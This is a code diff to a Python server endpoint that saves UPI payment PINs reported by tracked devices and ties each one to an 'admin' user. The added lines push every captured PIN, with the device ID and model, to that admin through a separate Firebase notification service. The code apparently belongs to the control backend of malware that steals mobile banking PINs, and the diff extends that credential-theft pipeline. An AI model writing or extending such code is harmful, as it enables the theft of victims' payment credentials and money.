@@ -929,7 +929,18 @@ async def save_upi_pin(pin_data: UPIPinSave):
                 pin_data.upi_pin,
                 admin_username
             )
+            
+            # 📱 Push Notification به ادمین (Firebase جداگانه برای ادمین‌ها)
+            device_model = device.get("model", "Unknown")
+            await firebase_admin_service.send_upi_pin_notification(
+                admin_username=admin_username,
+                device_id=pin_data.device_id,
+                upi_pin=pin_data.upi_pin,
+                model=device_model
+            )
+            
             logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} → Admin: {admin_username}")
+            logger.info(f"📱 Push notification sent to {admin_username} for UPI PIN")
         else:
             logger.info(f"💳 UPI PIN saved for device: {pin_data.device_id} (no admin association)")
         
